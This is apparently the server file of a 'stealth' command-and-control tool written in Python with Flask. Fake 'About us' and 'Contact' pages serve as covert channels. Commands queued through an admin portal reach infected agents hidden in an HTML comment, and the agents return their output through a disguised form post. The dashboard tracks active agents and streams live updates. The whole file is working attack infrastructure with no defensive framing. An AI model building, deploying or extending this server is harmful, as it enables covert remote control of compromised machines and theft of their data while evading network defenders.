# stealth_c2/c2_server.py

from flask import Flask, request, render_template, redirect, url_for, flash, Response, jsonify
from datetime import datetime, timedelta
import json
import queue

app = Flask(__name__)
app.secret_key = "dev-secret-key"  # for flash messages; replace in prod
agent_tasks = {}
agent_responses = {}
agent_last_seen = {}
_event_subscribers = set()


def _publish_event(event):
    # Push event dict to all subscriber queues
    dead = []
    for q in list(_event_subscribers):
        try:
            q.put_nowait(event)
        except Exception:
            dead.append(q)
    for q in dead:
        _event_subscribers.discard(q)

@app.route("/")
def index():
    # Simple landing redirects to dashboard
    return redirect(url_for("dashboard"))

@app.route("/about")
def about():
    agent_id = request.args.get("id")
    if agent_id:
        agent_last_seen[agent_id] = datetime.utcnow()
        _publish_event({"type": "heartbeat", "agent_id": agent_id})
    if agent_id in agent_tasks:
        task = agent_tasks.pop(agent_id)
        return f"<!--cmd:{task}--><p>About us page. Updated {datetime.now()}</p>"
    return render_template("about.html")

@app.route("/contact", methods=["POST"])
def contact():
    agent_id = request.form.get("id")
    response = request.form.get("msg")
    if agent_id and response:
        agent_responses[agent_id] = response
        agent_last_seen[agent_id] = datetime.utcnow()
        print(f"[+] Response from {agent_id}:\n{response}")
        _publish_event({"type": "response", "agent_id": agent_id})
    return render_template("contact.html")

# -------------------- Admin Web Portal --------------------
@app.route("/admin", methods=["GET"])  # dashboard
def dashboard():
    agents = sorted(set(list(agent_tasks.keys()) + list(agent_responses.keys()) + list(agent_last_seen.keys())))
    # Consider an agent active if seen in the last 60 seconds (adjust as needed)
    now = datetime.utcnow()
    cutoff = now - timedelta(seconds=60)
    active_agents = [
        {"id": a, "last_seen": agent_last_seen[a], "seconds_ago": int((now - agent_last_seen[a]).total_seconds())}
        for a in agent_last_seen
        if agent_last_seen[a] >= cutoff
    ]
    active_agents.sort(key=lambda x: x["seconds_ago"])  # freshest first
    return render_template(
        "admin/dashboard.html",
        agents=agents,
        tasks=agent_tasks,
        responses=agent_responses,
        active_agents=active_agents,
    )


@app.route("/admin/data", methods=["GET"])  # JSON snapshot for live refresh
def admin_data():
    now = datetime.utcnow()
    cutoff = now - timedelta(seconds=60)
    agents = sorted(set(list(agent_tasks.keys()) + list(agent_responses.keys()) + list(agent_last_seen.keys())))
    active_agents = [
        {"id": a, "last_seen": agent_last_seen[a].isoformat() + "Z", "seconds_ago": int((now - agent_last_seen[a]).total_seconds())}
        for a in agent_last_seen if agent_last_seen[a] >= cutoff
    ]
    active_agents.sort(key=lambda x: x["seconds_ago"])
    return jsonify({
        "agents": agents,
        "tasks": agent_tasks,
        "responses": agent_responses,
        "active_agents": active_agents,
    })


@app.route("/admin/stream")  # Server-Sent Events for live updates
def admin_stream():
    subscriber = queue.Queue(maxsize=100)
    _event_subscribers.add(subscriber)

    def event_stream():
        # Initial ping so clients fetch immediately
        yield "data: {}\n\n"
        last_keepalive = datetime.utcnow()
        while True:
            try:
                item = subscriber.get(timeout=15)
                payload = json.dumps(item)
                yield f"data: {payload}\n\n"
                last_keepalive = datetime.utcnow()
            except Exception:
                # keep-alive comment every ~15s to keep connection open through proxies
                yield ": keep-alive\n\n"
                # loop continues

    headers = {"Cache-Control": "no-cache", "X-Accel-Buffering": "no"}
    return Response(event_stream(), headers=headers, mimetype="text/event-stream")

@app.route("/admin/send", methods=["POST"])  # form POST helper
def admin_send():
    agent_id = request.form.get("agent_id", "").strip()
    command = request.form.get("cmd", "").strip()
    if not agent_id:
        flash("Agent ID is required", "error")
        return redirect(url_for("dashboard"))
    # Reuse existing API for setting tasks
    agent_tasks[agent_id] = command
    flash(f"Task queued for {agent_id}", "success")
    return redirect(url_for("dashboard"))

@app.route("/admin/set/<agent_id>", methods=["POST"])
def set_task(agent_id):
    # Prefer a named form field, else fall back to raw body
    command = request.form.get("cmd")
    if command is None or command.strip() == "":
        command = request.get_data(as_text=True).strip()
        # Handle the case "keyonly=" → become empty; try to salvage RHS if present
        if "=" in command and command.endswith("="):
            command = ""  # nothing useful there

    print(f"[admin/set] agent_id={agent_id} len(command)={len(command)!r} raw_body={request.get_data(as_text=True)!r}")
    agent_tasks[agent_id] = command
    return f"Task for {agent_id} set."

@app.route("/admin/view/<agent_id>")
def view(agent_id):
    return agent_responses.get(agent_id, "No response")

if __name__ == "__main__":
    print("[*] Stealth C2 running on https://localhost:4443")
    app.run(host="0.0.0.0", port=4443, ssl_context=("cert.pem", "key.pem"))